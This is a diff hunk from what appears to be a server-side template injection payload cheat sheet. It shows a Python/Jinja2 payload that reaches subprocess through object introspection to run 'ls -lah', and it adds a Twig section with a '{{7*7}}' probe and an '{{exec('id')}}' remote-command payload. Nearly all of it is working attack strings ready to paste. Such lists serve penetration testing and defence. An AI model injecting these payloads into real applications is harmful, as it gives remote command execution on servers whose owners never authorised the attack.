@@ -63,3 +63,13 @@
 ### check_output RCE Payload with arguments
 
     {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
+
+## PHP - Twig
+
+### PoC Payload
+
+    {{7*7}}
+
+### RCE Payload
+
+    {{exec('id')}}
